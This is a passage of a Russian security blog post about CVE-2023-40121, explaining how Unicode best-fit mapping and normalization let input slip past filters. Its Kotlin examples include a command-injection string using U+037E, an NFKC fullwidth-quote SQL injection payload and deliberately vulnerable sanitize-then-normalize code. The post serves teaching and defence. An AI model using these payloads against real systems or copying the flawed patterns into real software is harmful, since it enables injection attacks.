<!DOCTYPE html>
<html lang="ru" itemscope itemtype="http://schema.org/WebPage">
  <head>
    
<script type="text/javascript" >
    (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
    m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
    (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
 
    ym(64685116, "init", {
         clickmap:true,
         trackLinks:true,
         accurateTrackBounce:true
    });
 </script>
 <noscript><div><img src="https://mc.yandex.ru/watch/64685116" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
 

  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

  <title>CVE-2023-40121 - (не)Уникальный опыт</title>
  <meta name="description" content="В одном из бюллетеней безопасности ребята из Google рассказали про исправление интересной уязвимости в коде, отвечающем за работу с SQLite. Сам фикс довольно простой, да и сама уязвимость не то чтобы сильно страшная, но вот причины ее возникновения затрагивают очень глубокие и темные слои технологий кодирования информации. Поэтому давайте разберемся что же там под капотом и научимся эксплуатировать подобные уязвимости за границами android.
">
  <meta name="author" content="Fi5t"/><script type="application/ld+json">
{
    "@context": "http://schema.org",
    "@type": "WebSite",
    "name": "(не)Уникальный опыт",
    
    "url": "https:\/\/fi5t.xyz"
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Organization",
  "name": "",
  "url": "https:\/\/fi5t.xyz"
  
  
  
  
}
</script>
<script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [{
        "@type": "ListItem",
        "position": 1,
        "item": {
          "@id": "https:\/\/fi5t.xyz",
          "name": "home"
        }
    },{
        "@type": "ListItem",
        "position": 3,
        "item": {
          "@id": "https:\/\/fi5t.xyz\/posts\/cve-2023-40121\/",
          "name": "Cve 2023 40121"
        }
    }]
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Article",
  "author": {
    "name" : "Fi5t"
  },
  "headline": "CVE-2023-40121",
  "description" : "В одном из бюллетеней безопасности ребята из Google рассказали про исправление интересной уязвимости в коде, отвечающем за работу с SQLite. Сам фикс довольно простой, да и сама уязвимость не то чтобы сильно страшная, но вот причины ее возникновения затрагивают очень глубокие и темные слои технологий кодирования информации. Поэтому давайте разберемся что же там под капотом и научимся эксплуатировать подобные уязвимости за границами android.\n",
  "inLanguage" : "ru",
  "wordCount":  1759 ,
  "datePublished" : "2024-03-13T00:00:00",
  "dateModified" : "2024-03-13T00:00:00",
  "image" : "https:\/\/fi5t.xyz\/img\/avatar-icon.jpg",
  "keywords" : [ "mobile, android, безопасность, cve" ],
  "mainEntityOfPage" : "https:\/\/fi5t.xyz\/posts\/cve-2023-40121\/",
  "publisher" : {
    "@type": "Organization",
    "name" : "https:\/\/fi5t.xyz",
    "logo" : {
        "@type" : "ImageObject",
        "url" : "https:\/\/fi5t.xyz\/img\/avatar-icon.jpg",
        "height" :  60 ,
        "width" :  60
    }
  }
}
</script>

<meta property="og:title" content="CVE-2023-40121" />
<meta property="og:description" content="В одном из бюллетеней безопасности ребята из Google рассказали про исправление интересной уязвимости в коде, отвечающем за работу с SQLite. Сам фикс довольно простой, да и сама уязвимость не то чтобы сильно страшная, но вот причины ее возникновения затрагивают очень глубокие и темные слои технологий кодирования информации. Поэтому давайте разберемся что же там под капотом и научимся эксплуатировать подобные уязвимости за границами android.
">
<meta property="og:image" content="https://fi5t.xyz/img/avatar-icon.jpg" />
<meta property="og:url" content="https://fi5t.xyz/posts/cve-2023-40121/" />
<meta property="og:type" content="website" />
<meta property="og:site_name" content="(не)Уникальный опыт" />

  <meta name="twitter:title" content="CVE-2023-40121" />
  <meta name="twitter:description" content="В одном из бюллетеней безопасности ребята из Google рассказали про исправление интересной уязвимости в коде, отвечающем за работу с SQLite. Сам фикс довольно простой, да и сама уязвимость не то чтобы …">
  <meta name="twitter:image" content="https://fi5t.xyz/img/avatar-icon.jpg" />
  <meta name="twitter:card" content="summary_large_image" />
  <link href='https://fi5t.xyz/img/favicon.ico' rel='icon' type='image/x-icon'/>
  <meta name="generator" content="Hugo 0.121.2">
  <link rel="alternate" href="https://fi5t.xyz/index.xml" type="application/rss+xml" title="(не)Уникальный опыт"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://fi5t.xyz/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://fi5t.xyz/css/syntax.css" /><link rel="stylesheet" href="https://fi5t.xyz/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">



  </head>
  <body>
    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
        <span class="sr-only">Навигация</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="https://fi5t.xyz">(не)Уникальный опыт</a>
    </div>

    <div class="collapse navbar-collapse" id="main-navbar">
      <ul class="nav navbar-nav navbar-right">
        
          
            <li>
              <a title="Tags" href="/tags">Tags</a>
            </li>
          
        

        
          
            <li>
              
            </li>
          
        

        
      </ul>
    </div>

    
      <div class="avatar-container">
        <div class="avatar-img-border">
          <a title="(не)Уникальный опыт" href="https://fi5t.xyz">
            <img class="avatar-img" src="https://fi5t.xyz/img/avatar-icon.jpg" alt="(не)Уникальный опыт" />
          </a>
        </div>
      </div>
    

  </div>
</nav>




    


<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>













<header class="header-section ">
  
  <div class="intro-header no-img">
    <div class="container">
      <div class="row">
        <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
          <div class="posts-heading">
            
            <h1>CVE-2023-40121</h1>
            
            
            <hr class="small">
            
            
            
          </div>
        </div>
      </div>
    </div>
  </div>
</header>

    
<div class="container" role="main">
  <div class="row">
    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
      <article role="main" class="blog-post">
        <p>В одном из бюллетеней безопасности ребята из Google рассказали про <a href="https://android.googlesource.com/platform/frameworks/base/+/3287ac2d2565dc96bf6177967f8e3aed33954253">исправление</a> интересной уязвимости в коде, отвечающем за работу с SQLite. Сам фикс довольно простой, да и сама уязвимость не то чтобы сильно страшная, но вот причины ее возникновения затрагивают очень глубокие и темные слои технологий кодирования информации. Поэтому давайте разберемся что же там под капотом и научимся эксплуатировать подобные уязвимости за границами android.</p>
<p><img src="/img/cve-2023-40121/kdpv.png" alt=""></p>
<p>Суть уязвимости в том, что SQLite некорректно обрабатывает unicode последовательности, что приводит к затиранию уже экранированной кавычки парным суррогатом, что позволяет осуществить SQL-инъекцию в запрос.</p>
<p><img src="/img/cve-2023-40121/wtf.jpg" alt=""></p>
<p>Те, кто понял все, что написано выше — мотайте до конца статьи, там будет эксплойт. Для всех остальных проведу небольшой ликбез по Unicode.</p>
<h1 id="базовые-понятия">Базовые понятия</h1>
<p>Когда говорим о кодировках в целом и Unicode в частности, то всегда всплывает такое понятие как &ldquo;кодовая точка&rdquo;(code point). Оказалось, что не все его понимают однозначно, поэтому вот вам простое определение:</p>
<p><em><strong>Кодовая точка</strong> - целое число, которое представляет собой код символа. Например: A -&gt; 65 в ASCII</em></p>
<p>Знакомая всем <a href="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/ASCII-Table-wide.svg/2560px-ASCII-Table-wide.svg.png">кодировка ASCII</a>, в свою очередь, является подмножеством Unicode. Их первые 128 символов <strong>совпадают</strong>. Особо въедливый читатель может зацепиться за первое предложение в этом параграфе и сказать, что Unicode это не кодировка. И будет прав в этом случае. Это действительно не кодировка. Формально, Unicode это ассоциативный массив в котором символы соотносятся с различными <strong>целыми положительными числами</strong>. Т.е. это некий абстрактный стандарт кодировки и он не содержит никаких указаний по преобразованию текста в двоичные данные и обратно. Этим занимаются конкретные кодировки: UTF-8, UTF-16 и UTF-32, которые различаются количеством используемых <strong>байт на один символ</strong>.</p>
<blockquote>
<p>Unicode, formally The Unicode Standard, is a text encoding standard maintained by the Unicode Consortium designed to support the use of text written in all of the world&rsquo;s major writing systems. Version 15.1 of the standard defines 149813 characters and 161 scripts used in various ordinary, literary, academic, and technical contexts.</p>
</blockquote>
<p>Разберем на примере:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="s2">&#34;résumé&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="sa">b</span><span class="s1">&#39;r</span><span class="se">\xc3\xa9</span><span class="s1">sum</span><span class="se">\xc3\xa9</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="s2">&#34;El Niño&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="sa">b</span><span class="s1">&#39;El Ni</span><span class="se">\xc3\xb1</span><span class="s1">o&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="sa">b</span><span class="s2">&#34;r</span><span class="se">\xc3\xa9</span><span class="s2">sum</span><span class="se">\xc3\xa9</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;résumé&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="sa">b</span><span class="s2">&#34;El Ni</span><span class="se">\xc3\xb1</span><span class="s2">o&#34;</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;El Niño&#39;</span>
</span></span></code></pre></div><p>Из примера видно, что при кодировании строки <code>&quot;El Niño&quot;</code> в последовательность байт, все символы кроме <code>ñ</code> отображаются как есть. Причина в том, что литералы этого типа объектов допускают только ASCII отображение. Символ с тильдой, в свою очередь, кодируется в двухбайтовую последовательность: <code>\xc3\xb1</code> или <code>11000011 10110001</code> в двоичном виде.</p>
<p>В отличие от ASCII, кодировка UTF-8 это <strong>кодировка с переменным размером</strong>. Т.е. в ASCII любой символ всегда занимает один байт. В UTF-8 символы могут занимать от <strong>одного до четырех байт</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Пример четырехбайтного символа</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">ibrow</span> <span class="o">=</span> <span class="s2">&#34;🤨&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">ibrow</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">ibrow</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xf0\x9f\xa4\xa8</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">ibrow</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="mi">4</span>
</span></span></code></pre></div><p>Диапазоны символов</p>
<ul>
<li>0 - 127 (<code>\u0000</code> - <code>\u007F</code>) - однобайтовые. Соответствует U.S. ASCII</li>
<li>128 - 2047 (<code>\u0080</code> - <code>\u07FF</code>) - двухбайтовые. Большая часть латинских алфавитов (английский, арабский, греческий, ирландский т.д.)</li>
<li>2048 - 65535 (<code>\u0800</code> - <code>\uFFFF</code>) - трехбайтовые. Масса языков и символов, в основном китайский, японский и корейский с разделением по томам (а также ASCII и латиница)</li>
<li>65536 - 1114111 (<code>\U00010000</code> - <code>\U0010FFFF</code>) - четырехбайтовые. Дополнительные символы китайского, японского, корейского и вьетнамского, а также другие символы и <strong>эмоджи</strong></li>
</ul>
<p>В разных кодировках семейства UTF используется разное количество байт:</p>
<ul>
<li><strong>UTF-8</strong> - от 1 до 4</li>
<li><strong>UTF-16</strong> - от 2 до 4</li>
<li><strong>UTF-32</strong> - всегда 4</li>
</ul>
<p>Это порождает интересные эффекты, когда данные закодированные в одной кодировке на одном языке, при декодировании в другой кодировке могут стать символами другого языка:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">letters</span> <span class="o">=</span> <span class="s2">&#34;αβγδ&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">rawdata</span> <span class="o">=</span> <span class="n">letters</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">rawdata</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;αβγδ&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">rawdata</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-16&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;뇎닎돎듎&#39;</span>
</span></span></code></pre></div><h1 id="три-кита-unicode">Три кита Unicode</h1>
<p>Вся эта история с Unicode так или иначе о том, чтобы преобразовать что-то одно во что-то другое. Это следует из определения, и из самой сути Unicode (это ассоциативный массив, помните?). Обеспечением всей этой кухни занимаются три механизма:</p>
<ul>
<li>идеальная пара (best fit)</li>
<li>нормализация</li>
<li>сверхдлинные символы (over-long)</li>
</ul>
<p>Разберем каждый из них на примерах</p>
<h2 id="идеальная-пара-best-fit">Идеальная пара (best fit)</h2>
<p>Когда символа не существует в целевой кодировке этот механизм подставляет самый подходящий. Об этом уже частично говорилось в разделе про базовые понятия, поэтому тут рассмотрим каноничный пример уязвимости, которая может возникнуть в связи с работой этого механизма.</p>
<p>Допустим у нас есть вот такая упрощенная проверка на доступ к какому-то ресурсу:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-kotlin" data-lang="kotlin"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">userInput</span><span class="p">.</span><span class="n">toLowerCase</span><span class="p">()</span> <span class="o">==</span> <span class="s2">&#34;admin@facebook.com&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nc">Log</span><span class="p">.</span><span class="n">d</span><span class="p">(</span><span class="s2">&#34;AUTH&#34;</span><span class="p">,</span> <span class="s2">&#34;Access granted!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nc">Log</span><span class="p">.</span><span class="n">d</span><span class="p">(</span><span class="s2">&#34;AUTH&#34;</span><span class="p">,</span> <span class="s2">&#34;Access denied!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Что тут может пойти не так? Метод <code>toLowerCase()</code> задействует тот самый механизм <strong>best fit</strong> и если в качестве <code>userInput</code> передать почту вида <code>ADMIN@FACEBOO\u212A.com</code>, то символ <code>U+212A</code> (K) будет преобразован в <code>U+006B</code> (k) т.к. последний является наиболее подходящей парой. В результате проверка будет пройдена успешно. Откуда вы возьмете такую почту это уже детали 🙃</p>
<h2 id="нормализация">Нормализация</h2>
<p>Это отдельная большая тема, поэтому пробежимся лишь по верхам. Существует 4 алгоритма нормализации:</p>
<ul>
<li><strong>NFC</strong> - Normalization Form Canonical Composition (наиболее популярный)</li>
<li><strong>NFD</strong> - Normalization Form Canonical Decomposition</li>
<li><strong>NFKC</strong> - Normalization Form Compatibility Composition</li>
<li><strong>NFKD</strong> - Normalization Form Compatibility Decomposition</li>
</ul>
<p>Фактически, это две группы алгоритмов: для композиции и декомпозиции символов. Символы Unicode могут выглядеть одинаково, но иметь разные представления. Символ <code>â</code> может быть представлен как в виде одной кодовой точки <code>U+00E2</code>, так и в виде двух кодовых точек <code>a(U+0061)</code> и <code> ̂(U+0302)</code>. Это пример работы алгоритма <em>NFC</em>, когда символы раскладываются по канонической эквивалентности.</p>
<p>Конечно же такой сумрачный механизм не мог не породить потенциальных уязвимостей с ним связанных. Возьмем такой надуманный пример:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-kotlin" data-lang="kotlin"><span class="line"><span class="cl"><span class="k">val</span> <span class="py">maliciousInput</span> <span class="p">=</span> <span class="s2">&#34;whoami</span><span class="se">\u037e</span><span class="s2">id&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">maliciousInput</span><span class="p">.</span><span class="n">contains</span><span class="p">(</span><span class="s2">&#34;;&#34;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nc">Log</span><span class="p">.</span><span class="n">e</span><span class="p">(</span><span class="s2">&#34;ATTENTION&#34;</span><span class="p">,</span> <span class="s2">&#34;Malicious characters detected!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">val</span> <span class="py">normalized</span> <span class="p">=</span> <span class="nc">Normalizer</span><span class="p">.</span><span class="n">normalize</span><span class="p">(</span><span class="n">maliciousInput</span><span class="p">,</span> <span class="nc">Normalizer</span><span class="p">.</span><span class="nc">Form</span><span class="p">.</span><span class="n">NFC</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">val</span> <span class="py">process</span> <span class="p">=</span> <span class="nc">Runtime</span><span class="p">.</span><span class="n">getRuntime</span><span class="p">().</span><span class="n">exec</span><span class="p">(</span><span class="s2">&#34;/bin/sh -c </span><span class="si">$normalized</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">val</span> <span class="py">reader</span> <span class="p">=</span> <span class="n">BufferedReader</span><span class="p">(</span><span class="n">InputStreamReader</span><span class="p">(</span><span class="n">process</span><span class="p">.</span><span class="n">inputStream</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="k">val</span> <span class="py">output</span> <span class="p">=</span> <span class="n">reader</span><span class="p">.</span><span class="n">readText</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">reader</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">println</span><span class="p">(</span><span class="s2">&#34;Result: </span><span class="si">$output</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>Здесь проверяется символ разделения команд и если его нет, то далее строка нормализуется и передается на выполнение. Проблема тут как раз в том, что <code>U+037e</code> после нормализации будет преобразован в <code>;</code> уже после фильтрации.</p>
<p>Но алгоритм <strong>NFC</strong> дает злоумышленнику не так много полезных замен как <strong>NFKC</strong> и <strong>NFKD</strong>. Поэтому основные атаки на нормализацию обычно связаны с использованием именно этих алгоритмов. Рассмотрим пример обхода фильтра кавычек:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-kotlin" data-lang="kotlin"><span class="line"><span class="cl"><span class="k">fun</span> <span class="nf">sanitizeSQLString</span><span class="p">(</span><span class="n">sb</span><span class="p">:</span> <span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="n">StringBuilder</span><span class="p">,</span> <span class="n">sqlString</span><span class="p">:</span> <span class="n">String</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">sb</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="sc">&#39;\&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">sqlString</span><span class="p">.</span><span class="n">indexOf</span><span class="p">(</span><span class="sc">&#39;\&#39;&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="p">-</span><span class="m">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">val</span> <span class="py">length</span> <span class="p">=</span> <span class="n">sqlString</span><span class="p">.</span><span class="n">length</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="k">in</span> <span class="m">0</span> <span class="n">until</span> <span class="n">length</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">val</span> <span class="py">c</span> <span class="p">=</span> <span class="n">sqlString</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">==</span> <span class="sc">&#39;\&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">sb</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="sc">&#39;\&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="n">sb</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="n">sb</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">sqlString</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sb</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="sc">&#39;\&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="o">..</span><span class="p">.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">val</span> <span class="py">maliciousInput</span> <span class="p">=</span> <span class="s2">&#34;sub</span><span class="se">\uff07</span><span class="s2">union select sqlite_version()--&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">val</span> <span class="py">sb</span> <span class="p">=</span> <span class="n">StringBuilder</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">sb</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&#34;select title from entry where subtitle=&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sanitizeSQLString</span><span class="p">(</span><span class="n">sb</span><span class="p">,</span> <span class="n">maliciousInput</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">val</span> <span class="py">normalized</span> <span class="p">=</span> <span class="nc">Normalizer</span><span class="p">.</span><span class="n">normalize</span><span class="p">(</span><span class="n">sb</span><span class="p">.</span><span class="n">toString</span><span class="p">(),</span> <span class="nc">Normalizer</span><span class="p">.</span><span class="nc">Form</span><span class="p">.</span><span class="n">NFKC</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">val</span> <span class="py">c</span> <span class="p">=</span> <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">db</span><span class="p">.</span><span class="n">rawQuery</span><span class="p">(</span><span class="n">normalized</span><span class="p">,</span> <span class="k">null</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="n">e</span><span class="p">:</span> <span class="n">SQLiteException</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">e</span><span class="p">.</span><span class="n">printStackTrace</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Суть проблемы здесь та же — санитизация происходит до нормализации, а результат нормализации передается на выполнение. Множество других полезных для злоумышленника замен можно найти в <a href="https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html">этой</a> таблице.</p>
<h2 id="cверхдлинные-символы-over-long">Cверхдлинные символы (over-long)</h2>
<p>Как уже говорилось выше, любой однобайтовый символ в Unicode может быть представлен неcколькими байтами. Например символ <code>A (U+0041)</code> также можно представить как <code>U+00C1U+0081</code>. Встретив такое представление, декодер будет ожидать, что в длинной форме после байта <code>U+00C1</code> будет следовать какой-то другой.</p>

<link rel="stylesheet" href="https://fi5t.xyz/css/hugo-easy-gallery.css" />
<div class="box" >
  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <div class="img">
      <img itemprop="thumbnail" src="/img/cve-2023-40121/code-points.jpg" alt="/img/cve-2023-40121/code-points.jpg"/>
    </div>
    <a href="/img/cve-2023-40121/code-points.jpg" itemprop="contentUrl"></a>
  </figure>
</div>

<p>Этот эффект хорошо виден на следующем примере:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-kotlin" data-lang="kotlin"><span class="line"><span class="cl"><span class="k">val</span> <span class="py">orig</span> <span class="p">=</span> <span class="s2">&#34;xxx</span><span class="si">$inputyyy</span><span class="s2">&#34;</span><span class="p">.</span><span class="n">toByteArray</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">val</span> <span class="py">utf</span> <span class="p">=</span> <span class="n">String</span><span class="p">(</span><span class="n">orig</span><span class="p">,</span> <span class="nc">Charsets</span><span class="p">.</span><span class="n">UTF_8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">val</span> <span class="py">ascii</span> <span class="p">=</span> <span class="n">String</span><span class="p">(</span><span class="n">orig</span><span class="p">,</span> <span class="nc">Charsets</span><span class="p">.</span><span class="n">US_ASCII</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">println</span><span class="p">(</span><span class="s2">&#34;UTF: </span><span class="si">$utf</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">println</span><span class="p">(</span><span class="s2">&#34;ASCII: </span><span class="si">$ascii</span><span class="s2">&#34;</span><span class="p">)</span>
